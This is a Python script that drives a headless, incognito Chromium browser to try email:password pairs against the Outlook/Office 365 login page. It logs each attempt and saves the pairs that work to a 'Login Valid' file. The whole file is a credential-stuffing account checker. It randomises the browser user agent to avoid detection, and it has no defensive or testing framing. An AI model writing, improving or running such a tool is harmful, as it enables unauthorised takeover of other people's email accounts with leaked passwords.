import os
import time

from DrissionPage import ChromiumOptions, ChromiumPage
from fake_useragent import UserAgent

co = ChromiumOptions(read_file=False)
co.auto_port(True)
co.no_imgs(True).mute(True)
co.incognito(True)
co.headless(True)
co.set_argument('--no-sandbox')
co.set_argument('--disable-gpu')
co.set_argument("--disable-extensions")
co.set_argument('--window-size', '1920,1080')


# 主要逻辑
def login_check(email, passwd):
    with open("result/check history.txt", "a+", encoding="UTF-8") as writers:
        writers.write(f"{email}:{passwd}" + os.linesep)
    page = None
    try:
        ua = UserAgent()
        co.set_user_agent(ua.random)
        email = email.strip("\n")
        passwd = passwd.strip("\n")
        page = ChromiumPage(co)
        page.get("https://outlook.office365.com/mail/", retry=1, timeout=20)
        # 获取登录input，然后输入账号
        login_input = page.ele("@type=email")
        login_input.input(f"{email}\n")
        time.sleep(1)
        # 如果需要点击组织还是个人账户，则点击
        if page.ele("#aadTile", timeout=5):
            double_click_btn = page.ele("#aadTile", timeout=5)
            double_click_btn.click(by_js=True, timeout=1)
        if page.ele("#aadTile", timeout=5):
            double_click_btn = page.ele("#aadTile", timeout=5)
            double_click_btn.click(by_js=True, timeout=1)
        time.sleep(1)
        # 获取输入密码input，然后输入密码
        passwd_input = page.ele("@type=password")
        passwd_input.input(f"{passwd}\n")
        time.sleep(1)
        # 如果页面存在 不再显示此消息，则表示登录成功
        if page.ele("@name=DontShowAgain", timeout=5):
            # 获取是否保持登录中的否按钮，然后点击
            not_btn = page.ele("#idBtn_Back")
            not_btn.click()
            # 如果不存在邮箱授权，则会报 Something went wrong 错误
            if page.ele("Something went wrong", timeout=10):
                page.quit()
                return False
            else:
                page.quit()
                write_to_txt(f"{email}:{passwd}" + os.linesep)
                return True
        else:
            # 不存在 不再显示此消息
            # 可能是直接进入邮箱了，也可能密码错误等其它情况
            if page.url == "https://outlook.office365.com/mail/":
                page.quit()
                write_to_txt(f"{email}:{passwd}" + os.linesep)
                return True
            else:
                page.quit()
                return False
    except Exception as e:
        if page is not None:
            page.quit()
        with open("result/error line.txt", "a+", encoding="UTF-8") as writers:
            writers.write(f"{email}:{passwd}" + os.linesep)
        with open("result/error logs.txt", "a+", encoding="UTF-8") as writers:
            writers.write(f"Error: {e}" + os.linesep)


def write_to_txt(line):
    with open("result/Login Valid.txt", "a+", encoding="UTF-8") as writers:
        writers.write(line)
